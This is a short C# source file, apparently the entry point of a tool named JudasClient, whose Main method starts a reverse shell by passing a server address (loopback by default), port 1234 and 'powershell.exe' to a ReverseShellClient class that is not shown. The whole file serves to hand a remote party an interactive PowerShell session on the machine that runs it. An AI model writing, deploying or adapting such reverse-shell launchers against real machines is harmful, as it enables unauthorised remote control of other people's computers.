using System;
namespace JudasClient;

public class JudasShell
{
    public static void Main(string[] args)
    {
        ShellStart();
    }

    public static void ShellStart(string serverIp = "::1", int serverPort = 1234, string shell = "powershell.exe")
    {
        ReverseShellClient.Start(serverIp, serverPort, shell);
    }

}